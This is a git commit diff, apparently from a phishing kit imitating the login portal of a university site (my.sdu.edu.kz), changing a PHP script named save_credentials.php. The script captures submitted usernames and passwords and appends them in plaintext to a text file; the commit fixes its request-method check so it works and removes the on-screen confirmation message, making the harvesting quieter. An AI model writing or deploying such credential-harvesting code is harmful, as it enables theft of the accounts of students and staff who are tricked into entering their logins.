e2f72f4e8a9045e64e4ebbc73698686dbb4834e6
AliHack-667 <oalinur7@gmail.com>
2024-12-13 21:19:02 +0500

    Update save_credentials.php

--- my.sdu.edu.kz/save_credentials.php
+++ my.sdu.edu.kz/save_credentials.php
@@ -1,11 +1,7 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "post") {
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
-    
-    // Сохраняем данные в файл
     file_put_contents("user_credentials.txt", "Логин: $username, Пароль: $password\n", FILE_APPEND);
-    
-    echo "Данные сохранены!";
 }
 ?>
